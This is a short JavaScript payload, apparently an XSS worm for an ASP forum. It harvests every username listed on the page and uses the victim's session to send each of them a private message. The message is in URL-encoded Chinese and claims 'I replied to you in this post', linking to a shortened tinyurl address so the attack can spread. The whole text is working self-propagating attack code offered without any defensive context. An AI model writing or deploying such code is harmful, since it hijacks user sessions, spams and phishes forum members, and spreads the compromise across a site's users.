names = document.getElementsByClassName("tablebody1");
for(i=0;i<names.length;i++)
{
	if (names[i].children[0]) {touser = names[i].children[0].innerHTML;
	touser = touser.trim();
	
	if (touser.indexOf("img src") !== -1 || touser === "") {continue;};
	console.log(touser);
	xss.ajax('/messanger.asp?action=send','touser='+touser+'&font=&title='+'%E5%9B%9E%E5%A4%8D%E6%8F%90%E7%A4%BA&message=%E6%88%91%E5%9C%A8%5Burl%3Dhttp%3A%2F%2Ftinyurl.com%2Fa6exaj8%5D%5Bcolor%3Dblue%5D%E8%BF%99%E4%B8%AA%E5%B8%96%E5%AD%90%5B%2Fcolor%5D%5B%2Furl%5D%E9%87%8C%E4%B8%AD%E5%9B%9E%E5%A4%8D%E4%BA%86%E4%BD%A0%2C%E5%BF%AB%E6%9D%A5%E7%9C%8B%E7%9C%8B%E5%90%A7~!',function(){}); 
		}
}